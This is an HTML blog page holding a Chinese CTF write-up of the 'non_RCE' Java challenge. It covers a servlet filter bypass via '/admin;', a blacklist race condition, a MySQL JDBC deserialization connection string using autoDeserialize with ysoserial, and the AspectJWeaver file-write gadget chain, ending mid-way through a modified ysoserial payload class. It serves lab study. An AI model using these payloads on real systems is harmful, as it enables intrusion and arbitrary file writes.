@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"little-gu.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="non-rce-ctf复现搭建环境，https:&#x2F;&#x2F;github.com&#x2F;Ant-FG-Lab&#x2F;non_RCE filter绕过 访问admin的路由会401，login部分的filter实现如下 这里是没有办法绕过的，关注AntiUrlAttackFilter中的代码： 123456789101112131415if (url.contains(&quot;..&#x2F;&quot;) &amp;&amp;am">
+<meta property="og:type" content="article">
+<meta property="og:title" content="non-rce-ctf复现">
+<meta property="og:url" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="non-rce-ctf复现搭建环境，https:&#x2F;&#x2F;github.com&#x2F;Ant-FG-Lab&#x2F;non_RCE filter绕过 访问admin的路由会401，login部分的filter实现如下 这里是没有办法绕过的，关注AntiUrlAttackFilter中的代码： 123456789101112131415if (url.contains(&quot;..&#x2F;&quot;) &amp;&amp;am">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="article:published_time" content="2021-06-29T14:02:28.000Z">
+<meta property="article:modified_time" content="2021-06-29T14:38:03.693Z">
+<meta property="article:author" content="热爱篮球和安全的小伙子">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/1.png">
+
+
+<link rel="canonical" href="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>non-rce-ctf复现 | hungry and humble</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">hungry and humble</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#non-rce-ctf%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">non-rce-ctf复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">filter绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">jdbc反序列化和黑名单检测绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.</span> <span class="nav-text">mysql jdbc反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AspectJWeaver%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.4.</span> <span class="nav-text">AspectJWeaver利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.5.</span> <span class="nav-text">复现</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="热爱篮球和安全的小伙子"
+      src="/uploads/ckrie.jpg">
+  <p class="site-author-name" itemprop="name">热爱篮球和安全的小伙子</p>
+  <div class="site-description" itemprop="description">记录我的学习之旅</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/ckrie.jpg">
+      <meta itemprop="name" content="热爱篮球和安全的小伙子">
+      <meta itemprop="description" content="记录我的学习之旅">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hungry and humble">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          non-rce-ctf复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-06-29 22:02:28 / Modified: 22:38:03" itemprop="dateCreated datePublished" datetime="2021-06-29T22:02:28+08:00">2021-06-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="non-rce-ctf复现"><a href="#non-rce-ctf复现" class="headerlink" title="non-rce-ctf复现"></a>non-rce-ctf复现</h1><p>搭建环境，<a target="_blank" rel="noopener" href="https://github.com/Ant-FG-Lab/non_RCE">https://github.com/Ant-FG-Lab/non_RCE</a><br><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
+<h2 id="filter绕过"><a href="#filter绕过" class="headerlink" title="filter绕过"></a>filter绕过</h2><p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p>
+<p>访问admin的路由会401，login部分的filter实现如下<br><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p>
+<p>这里是没有办法绕过的，关注AntiUrlAttackFilter中的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (url.contains(<span class="string">&quot;../&quot;</span>) &amp;&amp; url.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; url.contains(<span class="string">&quot;//&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The &#x27;.&#x27; &amp; &#x27;/&#x27; is not  allowed in the url&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;\20&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The empty value is not  allowed in the url.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;The &#x27;\\&#x27; is not allowed  in the url.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;./&quot;</span>)) &#123;</span><br><span class="line">        String filteredUrl = url.replaceAll(<span class="string">&quot;./&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(filteredUrl).forward(servletRequest,  servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        String filteredUrl = url.replaceAll(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(filteredUrl).forward(servletRequest,  servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>会将;和./替换为空，可以根据这个访问/admin;绕过。官方wp解释主要目的是考察dispatch type，就是流量处理的类型。有FORWARD、INCLUDE、REQUEST、ASYNC、ERROR 5种类型。默认类型为REQUEST，在LoginFilter后添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dispatcherTypes = &#123;DispatcherType.REQUEST, DispatcherType.FORWARD&#125;</span><br></pre></td></tr></table></figure>
+<p>请求就不会经过过滤器，就不能进行绕过</p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p>
+<h2 id="jdbc反序列化和黑名单检测绕过"><a href="#jdbc反序列化和黑名单检测绕过" class="headerlink" title="jdbc反序列化和黑名单检测绕过"></a>jdbc反序列化和黑名单检测绕过</h2><p>攻击入口servlet.AdminServlet#doGet，实现了mysql的连接功能，并且jdbcurl我们可控。但是实现设置了一个黑名单{“%”, “autoDeserialize”}，预期解是利用黑名单检测逻辑存在的条件竞争问题。上代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlackListChecker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BlackListChecker blackListChecker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] blackList = <span class="keyword">new</span> String[] &#123;<span class="string">&quot;%&quot;</span>, <span class="string">&quot;autoDeserialize&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DataMap checkDataMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">volatile</span> String toBeChecked;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlackListChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; jdbcBlackList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        jdbcBlackList.add(blackList[<span class="number">0</span>]);</span><br><span class="line">        jdbcBlackList.add(blackList[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; checkMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        checkMap.put(<span class="string">&quot;jdbc&quot;</span>, jdbcBlackList);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.checkDataMap = <span class="keyword">new</span> DataMap(checkMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setToBeChecked</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.toBeChecked = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//单例blackListChecker对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BlackListChecker <span class="title">getBlackListChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blackListChecker == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blackListChecker = <span class="keyword">new</span> BlackListChecker();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blackListChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//黑名单检测流程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        BlackListChecker blackListChecker = getBlackListChecker();</span><br><span class="line">        blackListChecker.setToBeChecked(s);</span><br><span class="line">        <span class="keyword">return</span> blackListChecker.doCheck();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//黑名单检测</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String s : blackList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (toBeChecked.contains(s)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>生成单例blackListChecker对象，考察的是单例模式下条件竞争的问题。通过条件竞争来绕过黑名单检测机制，后续我把黑名单注释掉了，省了条件竞争的步骤。</p>
+<h2 id="mysql-jdbc反序列化"><a href="#mysql-jdbc反序列化" class="headerlink" title="mysql jdbc反序列化"></a>mysql jdbc反序列化</h2><p>之前没有接触过，就复现一下。</p>
+<p>复现环境commons-collections-3.2.1+jdk8u21+mysql-connector-java-8.0.13</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.ConnectException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url =  <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_calc&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p>生成恶意mysql服务端,运行测试文件，四次弹出计算器。(需要配置config.json中的yso命令参数)</p>
+<p>漏洞分析参考安全科的文章以及各个版本连接字符串的总结<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/20308">https://www.anquanke.com/post/id/20308</a></p>
+<h2 id="AspectJWeaver利用链"><a href="#AspectJWeaver利用链" class="headerlink" title="AspectJWeaver利用链"></a>AspectJWeaver利用链</h2><p>也是之前没有分析过，现在通过yso工具分析一波，利用版本&lt;=1.9.2。<br>利用链如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
+<p>借助cc里的TiedMapEntry和Lazymap类，最后通过调用SimpleCache$StorableCachingMap.put()成功写入文件。</p>
+<p>调试一下<br>HashSet中readObject()方法会调用put方法</p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p>
+<p>进入HashMap的put()方法</p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p>
+<p>调用hashcode()</p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p>
+<p>跟踪到TiedMapEntry的hashcode()方法和getvalue方法</p>
+<p><img src="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p>
+<p>this.map可控，最后进入到LazyMap类的get方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用put方法，最后调用栈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
+<p>写入文件。</p>
+<p>但是这里的环境并没有cc链，需要自己构造，找到可以代替cc的触发方式，也就是出题人写的DataMap类里有相关替代方法。</p>
+<p>参考大佬修改的poc。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.python.modules.time.Time;</span><br><span class="line"><span class="keyword">import</span> checker.DataMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@PayloadTest(skip=&quot;non RCE&quot;)</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;org.aspectj:aspectjweaver:1.9.2&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; &quot;sijidou&quot; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Antictf</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;filename&gt;:&lt;base64 Object&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] parts = command.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">        String filename = parts[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.decodeBase64(parts[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Reflections.getFirstCtor(<span 